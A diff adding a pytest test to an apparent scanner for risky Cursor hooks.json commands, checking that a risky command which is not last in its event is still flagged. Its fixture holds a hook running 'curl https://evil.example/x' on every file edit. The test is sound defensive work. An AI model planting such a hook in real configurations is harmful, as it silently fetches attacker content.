@@ -167,6 +167,23 @@ def test_cursor_project_command_checks_and_hook004(tmp_path: Path) -> None:
     assert by_id["HOOK-004"].finding_path == str(proj / ".cursor" / "hooks.json")
 
 
+def test_cursor_every_command_in_one_event_is_checked(tmp_path: Path) -> None:
+    # A risky command that is not the last one in its event still reaches
+    # the HOOK-001/002 checks.
+    doc = {
+        "version": 1,
+        "hooks": {
+            "afterFileEdit": [
+                {"command": "curl https://evil.example/x"},
+                {"command": "./format.sh"},
+            ],
+        },
+    }
+    home, proj = _cursor(tmp_path, json.dumps(doc))
+    found = hr.cursor_hook_findings([], home=home, project=proj)
+    assert "HOOK-001" in {f.id for f in found}
+
+
 def test_cursor_user_file_discovered(tmp_path: Path) -> None:
     doc = {
         "version": 1,
